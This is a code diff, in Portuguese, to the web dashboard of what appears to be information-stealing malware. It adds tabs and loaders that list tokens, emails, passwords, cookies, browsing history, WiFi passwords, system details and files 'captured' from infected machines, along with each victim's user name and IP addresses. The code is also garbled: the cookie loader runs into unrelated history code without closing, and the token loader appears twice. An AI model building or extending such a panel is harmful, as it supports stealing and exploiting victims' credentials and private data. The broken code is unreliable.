@@ -360,127 +360,30 @@ HTML_TEMPLATE = """
             gap: 25px; 
         }
         .card {
-            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
-            border: 1px solid rgba(124, 58, 237, 0.1);
-            border-radius: 16px; 
-            padding: 25px;
-            backdrop-filter: blur(10px);
-            transition: transform 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #7c3aed, #a855f7, #7c3aed);
-            background-size: 200% 100%;
-            animation: gradientMove 3s ease infinite;
-        }
-        @keyframes gradientMove {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
+            background: rgba(17, 17, 27, 0.9);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 12px; 
+            padding: 20px;
+            transition: transform 0.2s ease;
         }
         .card:hover { 
-            transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(124, 58, 237, 0.2);
         }
         .card h3 { 
             color: #a855f7; 
-            margin-bottom: 20px; 
-            font-size: 1.3rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .card h3::before {
-            content: '🖥️';
-            font-size: 1.2em;
-        }
-        .device-info {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .device-info-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #9ca3af;
-            font-size: 0.9rem;
-        }
-        .device-info-item strong {
-            color: #e0e0e0;
-        }
-        .device-status {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 16px;
-            background: rgba(34, 197, 94, 0.1);
-            border: 1px solid rgba(34, 197, 94, 0.2);
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-        .device-status.online {
-            background: rgba(34, 197, 94, 0.1);
-            border-color: rgba(34, 197, 94, 0.2);
-        }
-        .device-status.offline {
-            background: rgba(239, 68, 68, 0.1);
-            border-color: rgba(239, 68, 68, 0.2);
-        }
-        .status-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            margin-bottom: 15px; 
+            font-size: 1.1rem;
             font-weight: 600;
         }
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #22c55e;
-            animation: pulse 2s infinite;
-        }
-        .status-dot.offline {
-            background: #ef4444;
-            animation: none;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .device-actions {
-            display: flex;
-            gap: 10px;
-        }
-        .device-btn {
-            flex: 1;
-            padding: 10px 16px;
-            background: linear-gradient(135deg, #7c3aed, #6b21a8);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
+        .card p { 
+            margin: 6px 0; 
+            color: #e0e0e0; 
             font-size: 0.9rem;
+        }
+        .card strong { 
+            color: #a855f7; 
             font-weight: 500;
-            transition: all 0.3s ease;
-            text-align: center;
-        }
-        .device-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(124, 58, 237, 0.3);
-        }
-        .device-btn.screenshot {
-            background: linear-gradient(135deg, #22c55e, #16a34a);
-        }
-        .device-btn.screenshot:hover {
-            box-shadow: 0 5px 15px rgba(34, 197, 94, 0.3);
         }
         
         .token-card, .cookie-card, .password-card {
@@ -616,8 +519,12 @@ HTML_TEMPLATE = """
             <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
                 <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
                     <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('emails')">📧 Emails</button>
                     <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('history')">📜 Histórico</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('wifi')">� WiFi</button>
+                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('system')">⚙️ Sistema</button>
                     <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
                 </div>
                 
@@ -654,15 +561,229 @@ HTML_TEMPLATE = """
                 case 'tokens':
                     loadTokens();
                     break;
-                case 'cookies':
-                    loadCookies();
+                case 'emails':
+                    loadEmails();
                     break;
                 case 'passwords':
                     loadPasswords();
                     break;
+                case 'cookies':
+                    loadCookies();
+                    break;
+                case 'history':
+                    loadHistory();
+                    break;
+                case 'wifi':
+                    loadWifiPasswords();
+                    break;
+                case 'system':
+                    loadSystemInfo();
+                    break;
                 case 'files':
                     loadFiles();
                     break;
+                default:
+                    contentDiv.innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Categoria não encontrada</div>';
+            }
+        }
+
+        async function loadTokens() {
+            try {
+                const response = await fetch('/api/tokens_data');
+                const tokens = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
+                
+                const tokensList = document.getElementById('tokensList');
+                tokensList.innerHTML = '';
+                
+                tokens.forEach(token => {
+                    const tokenCard = document.createElement('div');
+                    tokenCard.className = 'token-card';
+                    tokenCard.innerHTML = `
+                        <div><strong>Token:</strong> ${token.token}</div>
+                        <div><strong>Válido:</strong> ${token.valid ? '✅' : '❌'}</div>
+                        <div><strong>Conta:</strong> ${JSON.stringify(token.account)}</div>
+                        <div><strong>Descriptografado:</strong> ${token.decrypted ? '✅' : '❌'}</div>
+                    `;
+                    tokensList.appendChild(tokenCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar tokens</div>';
+            }
+        }
+        
+        async function loadEmails() {
+            try {
+                const response = await fetch('/api/emails_data');
+                const emails = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>📧 Emails Capturados</h3><div id="emailsList"></div></div>';
+                
+                const emailsList = document.getElementById('emailsList');
+                emailsList.innerHTML = '';
+                
+                emails.forEach(email => {
+                    const emailCard = document.createElement('div');
+                    emailCard.className = 'token-card';
+                    emailCard.innerHTML = `
+                        <div><strong>Email:</strong> ${email}</div>
+                        <div><strong>Fonte:</strong> ${email.source || 'Sistema'}</div>
+                        <div><strong>Data:</strong> ${email.timestamp || 'N/A'}</div>
+                    `;
+                    emailsList.appendChild(emailCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar emails</div>';
+            }
+        }
+        
+        async function loadPasswords() {
+            try {
+                const response = await fetch('/api/passwords_data');
+                const passwords = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🔒 Senhas Capturadas</h3><div id="passwordsList"></div></div>';
+                
+                const passwordsList = document.getElementById('passwordsList');
+                passwordsList.innerHTML = '';
+                
+                passwords.forEach(password => {
+                    const passwordCard = document.createElement('div');
+                    passwordCard.className = 'password-card';
+                    passwordCard.innerHTML = `
+                        <div><strong>Serviço:</strong> ${password.service || password.target}</div>
+                        <div><strong>Usuário:</strong> ${password.username || 'N/A'}</div>
+                        <div><strong>Senha:</strong> ${password.password || '***'}</div>
+                        <div><strong>Tipo:</strong> ${password.type || 'Navegador'}</div>
+                    `;
+                    passwordsList.appendChild(passwordCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar senhas</div>';
+            }
+        }
+        
+        async function loadCookies() {
+            try {
+                const response = await fetch('/api/cookies_data');
+                const cookies = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>🍪 Cookies Capturados</h3><div id="cookiesList"></div></div>';
+                
+                const cookiesList = document.getElementById('cookiesList');
+                cookiesList.innerHTML = '';
+                
+                cookies.forEach(cookie => {
+                    const cookieCard = document.createElement('div');
+                    cookieCard.className = 'cookie-card';
+                    cookieCard.innerHTML = `
+                        <div><strong>Nome:</strong> ${cookie.name}</div>
+                        <div><strong>Valor:</strong> ${cookie.value}</div>
+                        <div><strong>Domínio:</strong> ${cookie.domain}</div>
+                        <div><strong>Expira:</strong> ${cookie.expires || 'Sessão'}</div>
+                    `;
+                    cookiesList.appendChild(cookieCard);
+                contentDiv.innerHTML = '<div class="data-section"><h3>📜 Histórico de Navegação</h3><div id="historyList"></div></div>';
+                
+                const historyList = document.getElementById('historyList');
+                historyList.innerHTML = '';
+                
+                history.forEach(item => {
+                    const historyCard = document.createElement('div');
+                    historyCard.className = 'token-card';
+                    historyCard.innerHTML = `
+                        <div><strong>Título:</strong> ${item.title || 'N/A'}</div>
+                        <div><strong>URL:</strong> ${item.url || 'N/A'}</div>
+                        <div><strong>Visitas:</strong> ${item.visit_count || 1}</div>
+                        <div><strong>Data:</strong> ${item.last_visit || 'N/A'}</div>
+                    `;
+                    historyList.appendChild(historyCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar histórico</div>';
+            }
+        }
+        
+        async function loadWifiPasswords() {
+            try {
+                const response = await fetch('/api/wifi_data');
+                const wifiPasswords = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>📶 Senhas WiFi</h3><div id="wifiList"></div></div>';
+                
+                const wifiList = document.getElementById('wifiList');
+                wifiList.innerHTML = '';
+                
+                wifiPasswords.forEach(wifi => {
+                    const wifiCard = document.createElement('div');
+                    wifiCard.className = 'password-card';
+                    wifiCard.innerHTML = `
+                        <div><strong>Rede:</strong> ${wifi.ssid}</div>
+                        <div><strong>Senha:</strong> ${wifi.password || '***'}</div>
+                        <div><strong>Tipo:</strong> ${wifi.auth || 'WPA2'}</div>
+                        <div><strong>Sinal:</strong> ${wifi.signal || 'N/A'}</div>
+                    `;
+                    wifiList.appendChild(wifiCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar senhas WiFi</div>';
+            }
+        }
+        
+        async function loadSystemInfo() {
+            try {
+                const response = await fetch('/api/system_data');
+                const systemInfo = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>⚙️ Informações do Sistema</h3><div id="systemList"></div></div>';
+                
+                const systemList = document.getElementById('systemList');
+                systemList.innerHTML = '';
+                
+                Object.keys(systemInfo).forEach(key => {
+                    const infoCard = document.createElement('div');
+                    infoCard.className = 'token-card';
+                    infoCard.innerHTML = `
+                        <div><strong>${key}:</strong> ${systemInfo[key]}</div>
+                    `;
+                    systemList.appendChild(infoCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar informações do sistema</div>';
+            }
+        }
+        
+        async function loadFiles() {
+            try {
+                const response = await fetch('/api/files_data');
+                const files = await response.json();
+                
+                const contentDiv = document.getElementById('dataContent');
+                contentDiv.innerHTML = '<div class="data-section"><h3>📁 Arquivos Capturados</h3><div id="filesList"></div></div>';
+                
+                const filesList = document.getElementById('filesList');
+                filesList.innerHTML = '';
+                
+                files.forEach(file => {
+                    const fileCard = document.createElement('div');
+                    fileCard.className = 'token-card';
+                    fileCard.innerHTML = `
+                        <div><strong>Nome:</strong> ${file.name}</div>
+                        <div><strong>Caminho:</strong> ${file.path}</div>
+                        <div><strong>Tamanho:</strong> ${file.size || 'N/A'}</div>
+                        <div><strong>Tipo:</strong> ${file.type || 'N/A'}</div>
+                    `;
+                    filesList.appendChild(fileCard);
+                });
+            } catch (error) {
+                document.getElementById('dataContent').innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Erro ao carregar arquivos</div>';
             }
         }
 
@@ -679,59 +800,15 @@ HTML_TEMPLATE = """
                     div.className = 'card';
                     div.innerHTML = `
                         <h3>${endpoint.hostname}</h3>
-                        <div class="device-status ${endpoint.status || 'online'}">
-                            <span class="status-indicator">
-                                <span class="status-dot ${endpoint.status === 'offline' ? 'offline' : ''}"></span>
-                                ${endpoint.status === 'offline' ? 'Offline' : 'Online'}
-                            </span>
-                            <span style="color: #9ca3af; font-size: 0.8rem;">${endpoint.last_seen || 'Agora'}</span>
-                        </div>
-                        <div class="device-info">
-                            <div class="device-info-item">
-                                <span>👤</span>
-                                <div>
-                                    <strong>Usuário:</strong> ${endpoint.user}
-                                </div>
-                            </div>
-                            <div class="device-info-item">
-                                <span>🌐</span>
-                                <div>
-                                    <strong>IP Local:</strong> ${endpoint.ip_address}
-                                </div>
-                            </div>
-                            <div class="device-info-item">
-                                <span>🌍</span>
-                                <div>
-                                    <strong>IP Externo:</strong> ${endpoint.external_ip}
-                                </div>
-                            </div>
-                            <div class="device-info-item">
-                                <span>💻</span>
-                                <div>
-                                    <strong>Sistema:</strong> ${endpoint.platform}
-                                </div>
-                            </div>
-                            <div class="device-info-item">
-                                <span>💾</span>
-                                <div>
-                                    <strong>RAM:</strong> ${endpoint.ram}
-                                </div>
-                            </div>
-                            <div class="device-info-item">
-                                <span>🆔</span>
-                                <div>
-                                    <strong>ID:</strong> ${endpoint.id}
-                                </div>
-                            </div>
-                        </div>
-                        <div class="device-actions">
-                            <button class="device-btn" onclick="showEndpointDetails('${endpoint.id}')">
-                                📋 Detalhes
-                            </button>
-                            <button class="device-btn screenshot" onclick="requestScreenshot('${endpoint.id}')">
-                                📸 Screenshot
-                            </button>
-                        </div>
+                        <p><strong>ID:</strong> ${endpoint.id}</p>
+                        <p><strong>Usuário:</strong> ${endpoint.user}</p>
+                        <p><strong>IP Local:</strong> ${endpoint.ip_address}</p>
+                        <p><strong>IP Externo:</strong> ${endpoint.external_ip}</p>
+                        <p><strong>Plataforma:</strong> ${endpoint.platform}</p>
+                        <p><strong>RAM:</strong> ${endpoint.ram}</p>
+                        <p><strong>Status:</strong> 🟢 Online</p>
+                        <p><strong>Visto:</strong> ${endpoint.last_seen}</p>
+                        <button class="tab" style="margin-top: 15px; padding: 8px 16px; background: linear-gradient(135deg, #7c3aed, #6b21a8); color: white; border: none; border-radius: 6px; cursor: pointer;" onclick="showDeviceData('${endpoint.id}')">� Dados</button>
                     `;
                     container.appendChild(div);
                 });
@@ -753,8 +830,8 @@ HTML_TEMPLATE = """
             }
         }
         
-        function showEndpointDetails(endpointId) {
-            alert(`Detalhes do endpoint ${endpointId}\n\nFunção em desenvolvimento...`);
+        function showDeviceData(endpointId) {
+            alert(`Dados do dispositivo ${endpointId}\n\nFunção em desenvolvimento...`);
         }
 
         async function loadTokens() {
